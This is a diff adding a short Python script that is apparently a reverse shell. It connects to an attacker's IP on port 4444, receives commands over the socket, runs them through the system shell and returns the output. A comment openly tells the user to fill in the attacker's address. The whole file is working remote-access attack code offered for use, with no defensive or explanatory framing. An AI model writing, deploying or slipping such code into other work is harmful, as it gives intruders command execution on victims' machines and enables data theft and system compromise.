@@ -1,0 +1,29 @@
+import socket
+import os
+import subprocess
+import sys
+
+# Create a socket connection to your attacker's IP and port
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("Your_Ip_Address", 4444))  # Replace with your IP and port
+
+while True:
+    try:
+        cmd = s.recv(1024).decode()
+        if cmd == "exit":
+            break
+        if cmd == "list":
+            output = os.listdir()
+        elif cmd.startswith("cd "):
+            os.chdir(cmd[3:])
+        elif cmd == "clear":
+            os.system("cls" if os.name == "nt" else "clear")
+        else:
+            output = subprocess.check_output(cmd, shell=True).decode()
+
+        s.send(output.encode())
+    except Exception as e:
+        s.send(str(e).encode())
+
+s.close()
+sys.exit()
